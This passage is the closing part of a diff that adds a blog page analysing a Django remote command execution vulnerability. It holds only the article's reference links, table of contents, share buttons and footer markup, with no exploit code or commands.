+<li><a href="http://drops.wooyun.org/web/8528" target="_blank" rel="noopener">http://drops.wooyun.org/web/8528</a></li>
+<li><a href="http://www.securityfocus.com/bid/5255/info" target="_blank" rel="noopener">http://www.securityfocus.com/bid/5255/info</a></li>
+<li><a href="http://www.securityfocus.com/bid/5257/info" target="_blank" rel="noopener">http://www.securityfocus.com/bid/5257/info</a></li>
+<li><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">https://blog.nelhage.com/2011/03/exploiting-pickle/</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、背景"><span class="toc-number">1.</span> <span class="toc-text">一、背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、分析"><span class="toc-number">2.</span> <span class="toc-text">二、分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、Demo"><span class="toc-number">3.</span> <span class="toc-text">三、Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、小结"><span class="toc-number">4.</span> <span class="toc-text">四、小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/09/12/django-command-execution-analysis/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&text=Django 远程命令执行漏洞详解"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&is_video=false&description=Django 远程命令执行漏洞详解"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Django 远程命令执行漏洞详解&body=Check out this article: http://rickgray.me/2015/09/12/django-command-execution-analysis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&title=Django 远程命令执行漏洞详解"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/09/12/django-command-execution-analysis/&name=Django 远程命令执行漏洞详解&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
